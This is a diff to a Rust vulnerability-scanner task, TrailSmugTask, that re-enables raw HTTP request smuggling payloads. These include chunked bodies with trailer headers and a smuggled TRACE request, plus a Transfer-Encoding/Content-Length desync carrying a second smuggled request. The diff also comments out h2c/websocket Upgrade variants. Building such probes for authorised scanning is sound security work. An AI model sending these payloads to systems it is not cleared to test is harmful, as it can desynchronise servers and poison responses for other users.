@@ -34,50 +34,50 @@ impl TrailSmugTask {
         let path = format!("{}?cb=bbscan&nxoec=kmceo", target.path().to_string());
         let authority = target.authority().unwrap_or("localhost".to_string());
 
-        // payloads.push(format!(
-        //     "\
-        //     POST {path} HTTP/1.1\r\n\
-        //     Host: {authority}\r\n\
-        //     User-Agent: {HTTP_USER_AGENT}\r\n\
-        //     Transfer-Encoding: chunked\r\n\
-        //     \r\n\
-        //     2\r\n\
-        //     aa\r\n\
-        //     0\r\n\
-        //     any: value\r\n\
-        //     TRACE /vcmapfqpie/xsqweer?: HTTP/1.1\r\n\
-        //     X: "
-        // ));
+        payloads.push(format!(
+            "\
+            POST {path} HTTP/1.1\r\n\
+            Host: {authority}\r\n\
+            User-Agent: {HTTP_USER_AGENT}\r\n\
+            Transfer-Encoding: chunked\r\n\
+            \r\n\
+            2\r\n\
+            aa\r\n\
+            0\r\n\
+            any: value\r\n\
+            TRACE /vcmapfqpie/xsqweer?: HTTP/1.1\r\n\
+            X: "
+        ));
 
-        // payloads.push(format!(
-        //     "\
-        //     POST {path} HTTP/1.1\r\n\
-        //     Host: {authority}\r\n\
-        //     User-Agent: {HTTP_USER_AGENT}\r\n\
-        //     Transfer-Encoding: chunked\r\n\
-        //     \r\n\
-        //     2\r\n\
-        //     aa\r\n\
-        //     0\r\n\
-        //     any: value\n\n\
-        //     TRACE /vcmapfqpie/xsqweer?: HTTP/1.1\r\n\
-        //     X: "
-        // ));
+        payloads.push(format!(
+            "\
+            POST {path} HTTP/1.1\r\n\
+            Host: {authority}\r\n\
+            User-Agent: {HTTP_USER_AGENT}\r\n\
+            Transfer-Encoding: chunked\r\n\
+            \r\n\
+            2\r\n\
+            aa\r\n\
+            0\r\n\
+            any: value\n\n\
+            TRACE /vcmapfqpie/xsqweer?: HTTP/1.1\r\n\
+            X: "
+        ));
 
-        // payloads.push(format!(
-        //     "\
-        //     POST {path} HTTP/1.1\r\n\
-        //     Host: {authority}\r\n\
-        //     User-Agent: {HTTP_USER_AGENT}\r\n\
-        //     Transfer-Encoding: chunked\r\n\
-        //     \r\n\
-        //     2\r\n\
-        //     aa\r\n\
-        //     0\r\n\
-        //     a\r\n\
-        //     TRACE /vcmapfqpie/xsqweer?: HTTP/1.1\r\n\
-        //     X: "
-        // ));
+        payloads.push(format!(
+            "\
+            POST {path} HTTP/1.1\r\n\
+            Host: {authority}\r\n\
+            User-Agent: {HTTP_USER_AGENT}\r\n\
+            Transfer-Encoding: chunked\r\n\
+            \r\n\
+            2\r\n\
+            aa\r\n\
+            0\r\n\
+            a\r\n\
+            TRACE /vcmapfqpie/xsqweer?: HTTP/1.1\r\n\
+            X: "
+        ));
 
         let smug = format!(
             "\
@@ -86,46 +86,48 @@ impl TrailSmugTask {
         );
         let len = smug.len();
 
-        // payloads.push(format!(
-        //     "\
-        //     POST {path} HTTP/1.1\r\n\
-        //     Host: {authority}\r\n\
-        //     Connection: keep-alive\r\n\
-        //     User-Agent: {HTTP_USER_AGENT}\r\n\
-        //     Transfer-Encoding: chunked\r\n\
-        //     \r\n\
-        //     0\r\n\
-        //     any: value\r\n\
-        //     a\r\n\
-        //     \r\n\
-        //     POST {path} HTTP/1.1\r\n\
-        //     Host: {authority}\r\n\
-        //     Connection: keep-alive\r\n\
-        //     User-Agent: {HTTP_USER_AGENT}\r\n\
-        //     Content-Length: {len}\r\n\
-        //     \r\n\
-        //     {smug}"
-        // ));
+        payloads.push(format!(
+            "\
+            POST {path} HTTP/1.1\r\n\
+            Host: {authority}\r\n\
+            Connection: keep-alive\r\n\
+            User-Agent: {HTTP_USER_AGENT}\r\n\
+            Transfer-Encoding: chunked\r\n\
+            \r\n\
+            0\r\n\
+            any: value\r\n\
+            a\r\n\
+            \r\n\
+            POST {path} HTTP/1.1\r\n\
+            Host: {authority}\r\n\
+            Connection: keep-alive\r\n\
+            User-Agent: {HTTP_USER_AGENT}\r\n\
+            Content-Length: {len}\r\n\
+            \r\n\
+            {smug}"
+        ));
 
-        // payloads.push(format!(
-        //     "\
-        //     POST {path} HTTP/1.1\r\n\
-        //     Host: {authority}\r\n\
-        //     Connection: keep-alive\r\n\
-        //     User-Agent: {HTTP_USER_AGENT}\r\n\
-        //     Transfer-Encoding: chunked\r\n\
-        //     \r\n\
-        //     0\r\n\
-        //     any: value\n\
-        //     \n\
-        //     POST {path} HTTP/1.1\r\n\
-        //     Host: {authority}\r\n\
-        //     Connection: keep-alive\r\n\
-        //     User-Agent: {HTTP_USER_AGENT}\r\n\
-        //     Content-Length: {len}\r\n\
-        //     \r\n\
-        //     {smug}"
-        // ));
+        payloads.push(format!(
+            "\
+            POST {path} HTTP/1.1\r\n\
+            Host: {authority}\r\n\
+            Connection: keep-alive\r\n\
+            User-Agent: {HTTP_USER_AGENT}\r\n\
+            Transfer-Encoding: chunked\r\n\
+            \r\n\
+            0\r\n\
+            any: value\n\
+            \n\
+            POST {path} HTTP/1.1\r\n\
+            Host: {authority}\r\n\
+            Connection: keep-alive\r\n\
+            User-Agent: {HTTP_USER_AGENT}\r\n\
+            Content-Length: {len}\r\n\
+            \r\n\
+            {smug}"
+        ));
+
+        // -----
 
         // payloads.push(format!(
         //     "\
@@ -232,68 +234,68 @@ impl TrailSmugTask {
 
         // ------
 
-        payloads.push(format!(
-            "\
-            GET {path} HTTP/1.1\r\n\
-            Host: {authority}\r\n\
-            Connection: upgrade\r\n\
-            User-Agent: {HTTP_USER_AGENT}\r\n\
-            Content-Length: {len}\r\n\
-            Content-Type: application/www-form-urlencoded\r\n\
-            Upgrade:\r\n\th2c,websocket\r\n\
-            \r\n\
-            {smug}"
-        ));
+        // payloads.push(format!(
+        //     "\
+        //     GET {path} HTTP/1.1\r\n\
+        //     Host: {authority}\r\n\
+        //     Connection: upgrade\r\n\
+        //     User-Agent: {HTTP_USER_AGENT}\r\n\
+        //     Content-Length: {len}\r\n\
+        //     Content-Type: application/www-form-urlencoded\r\n\
+        //     Upgrade:\r\n\th2c,websocket\r\n\
+        //     \r\n\
+        //     {smug}"
+        // ));
 
-        payloads.push(format!(
-            "\
-            HEAD {path} HTTP/1.1\r\n\
-            Host: {authority}\r\n\
-            Connection: keep-alive\r\n\
-            User-Agent: {HTTP_USER_AGENT}\r\n\
-            Content-Length: {len}\r\n\
-            Upgrade:\r\n\th2c,websocket\r\n\
-            \r\n\
-            {smug}"
-        ));
+        // payloads.push(format!(
+        //     "\
+        //     HEAD {path} HTTP/1.1\r\n\
+        //     Host: {authority}\r\n\
+        //     Connection: keep-alive\r\n\
+        //     User-Agent: {HTTP_USER_AGENT}\r\n\
+        //     Content-Length: {len}\r\n\
+        //     Upgrade:\r\n\th2c,websocket\r\n\
+        //     \r\n\
+        //     {smug}"
+        // ));
 
-        payloads.push(format!(
-            "\
-            OPTIONS {path} HTTP/1.1\r\n\
-            Host: {authority}\r\n\
-            Connection: upgrade\r\n\
-            User-Agent: {HTTP_USER_AGENT}\r\n\
-            Content-Length: {len}\r\n\
-            Upgrade:\r\n\th2c,websocket\r\n\
-            \r\n\
-            {smug}"
-        ));
+        // payloads.push(format!(
+        //     "\
+        //     OPTIONS {path} HTTP/1.1\r\n\
+        //     Host: {authority}\r\n\
+        //     Connection: upgrade\r\n\
+        //     User-Agent: {HTTP_USER_AGENT}\r\n\
+        //     Content-Length: {len}\r\n\
+        //     Upgrade:\r\n\th2c,websocket\r\n\
+        //     \r\n\
+        //     {smug}"
+        // ));
 
         // ------
 
-        payloads.push(format!(
-            "\
-            GET {path} HTTP/1.1\r\n\
-            Host: {authority}\r\n\
-            Connection: upgrade\r\n\
-            User-Agent: {HTTP_USER_AGENT}\r\n\
-            Content-Length: {len}\r\n\
-            Upgrade: h2c,websocket\r\n\
-            \r\n\
-            {smug}"
-        ));
+        // payloads.push(format!(
+        //     "\
+        //     GET {path} HTTP/1.1\r\n\
+        //     Host: {authority}\r\n\
+        //     Connection: upgrade\r\n\
+        //     User-Agent: {HTTP_USER_AGENT}\r\n\
+        //     Content-Length: {len}\r\n\
+        //     Upgrade: h2c,websocket\r\n\
+        //     \r\n\
+        //     {smug}"
+        // ));
 
-        payloads.push(format!(
-            "\
-            OPTIONS {path} HTTP/1.1\r\n\
-            Host: {authority}\r\n\
-            Connection: upgrade\r\n\
-            User-Agent: {HTTP_USER_AGENT}\r\n\
-            Content-Length: {len}\r\n\
-            Upgrade: h2c,websocket\r\n\
-            \r\n\
-            {smug}"
-        ));
+        // payloads.push(format!(
+        //     "\
+        //     OPTIONS {path} HTTP/1.1\r\n\
+        //     Host: {authority}\r\n\
+        //     Connection: upgrade\r\n\
+        //     User-Agent: {HTTP_USER_AGENT}\r\n\
+        //     Content-Length: {len}\r\n\
+        //     Upgrade: h2c,websocket\r\n\
+        //     \r\n\
+        //     {smug}"
+        // ));
 
         // payloads.push(format!(
         //     "\
